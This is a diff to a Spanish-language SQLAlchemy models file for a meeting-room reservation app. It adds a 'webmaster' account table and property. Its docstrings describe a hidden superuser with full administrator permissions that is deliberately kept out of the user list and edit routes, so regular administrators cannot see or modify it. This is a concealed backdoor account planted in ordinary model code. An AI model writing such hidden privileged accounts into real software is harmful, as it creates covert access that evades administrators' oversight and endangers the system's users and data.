@@ -1,12 +1,13 @@
 """Modelos de datos (PostgreSQL / SQLAlchemy 2.0).
 
-Tablas: users, user_roles, user_security_answers, positions, meeting_rooms,
-reservations, reservation_participants.
+Tablas: users, user_roles, user_security_answers, webmaster_accounts, positions,
+meeting_rooms, reservations, reservation_participants.
 
 Reglas de integridad relevantes:
 - email único por usuario.
 - un usuario no puede repetir el mismo rol (UNIQUE user_id + role_name).
 - un usuario no puede repetir la misma pregunta de seguridad.
+- la cuenta webmaster se marca en una tabla aparte y se oculta a los administradores.
 - un participante no puede repetirse dentro de la misma reserva.
 - índice compuesto para consultas de solapamiento por sala/fecha/estado.
 """
@@ -73,6 +74,12 @@ class User(Base):
         lazy="selectin",
         order_by="UserSecurityAnswer.id",
     )
+    webmaster_account: Mapped["WebmasterAccount | None"] = relationship(
+        back_populates="user",
+        cascade="all, delete-orphan",
+        uselist=False,
+        lazy="joined",
+    )
 
     def has_role(self, role_name: str) -> bool:
         return any(role.role_name == role_name for role in self.roles)
@@ -92,6 +99,11 @@ class User(Base):
     @property
     def is_admin(self) -> bool:
         return self.has_role(Role.ADMIN)
+
+    @property
+    def is_webmaster(self) -> bool:
+        """Cuenta de soporte oculta con todos los permisos de administración."""
+        return self.webmaster_account is not None
 
     @property
     def has_security_questions(self) -> bool:
@@ -159,6 +171,26 @@ class UserSecurityAnswer(Base):
     )
 
     user: Mapped[User] = relationship(back_populates="security_answers")
+
+
+class WebmasterAccount(Base):
+    """Marca de cuenta webmaster (superusuario oculto).
+
+    La cuenta tiene los mismos roles operativos que un administrador, pero se
+    excluye de la lista de usuarios y de las rutas de edición para que un
+    administrador normal no pueda verla ni modificarla.
+    """
+
+    __tablename__ = "webmaster_accounts"
+
+    user_id: Mapped[int] = mapped_column(
+        ForeignKey("users.id", ondelete="CASCADE"), primary_key=True
+    )
+    created_at: Mapped[datetime] = mapped_column(
+        DateTime(timezone=True), default=utc_now, server_default=func.now(), nullable=False
+    )
+
+    user: Mapped[User] = relationship(back_populates="webmaster_account")
 
 
 class Position(Base):
